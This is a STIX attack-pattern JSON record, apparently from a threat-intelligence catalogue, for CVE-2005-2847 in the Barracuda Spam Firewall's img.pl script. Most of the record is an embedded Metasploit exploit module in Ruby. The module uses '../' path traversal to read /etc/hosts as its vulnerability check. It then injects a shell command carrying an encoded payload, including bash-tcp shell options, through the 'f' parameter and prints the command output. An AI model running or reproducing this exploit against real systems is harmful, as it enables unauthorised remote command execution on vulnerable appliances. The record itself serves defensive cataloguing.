{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e65479fc-1c18-45b8-a973-55ca5d987b10",
    "created": "2024-08-14T17:13:16.821104Z",
    "modified": "2024-08-14T17:13:16.821108Z",
    "name": "Barracuda IMG.PL Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the Barracuda Spam Firewall appliance. Versions prior to 3.1.18 are vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/barracuda_img_exec.rb",
            "external_id": "barracuda_img_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2847"
        },
        {
            "source_name": "reference",
            "url": "http://www.nessus.org/plugins/index.php?view=single&id=19556"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Barracuda IMG.PL Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in the\n        Barracuda Spam Firewall appliance. Versions prior to 3.1.18 are vulnerable.\n      },\n      'Author'         => [ 'Nicolas Gregoire <ngregoire[at]exaprobe.com>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-2847'],\n          ['OSVDB', '19279'],\n          ['BID', '14712'],\n          ['URL', 'http://www.nessus.org/plugins/index.php?view=single&id=19556']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 4000,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby bash-tcp telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2005-09-01',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The full URI path to img.pl\", \"/cgi-bin/img.pl\"]),\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'vars_get' =>\n      {\n        'f' => (\"../\" * 8) + \"etc/hosts\"\n      }\n    }, 25)\n\n    if (res and res.body.match(/localhost/))\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'vars_get' =>\n      {\n        'f' => (\"../\" * 8) + %Q!bin/sh -c \"echo 'YYY'; #{payload.encoded}; echo 'YYY'\"|!\n      }\n    }, 25)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n      print(\"\")\n\n      m = res.body.match(/YYY(.*)YYY/)\n\n      if (m)\n        print_status(\"Command output from the server:\")\n        print(m[1])\n      else\n        print_status(\"This server may not be vulnerable\")\n      end\n\n    else\n      print_status(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-09-01",
    "x_mitre_platforms": [
        "unix'"
    ]
}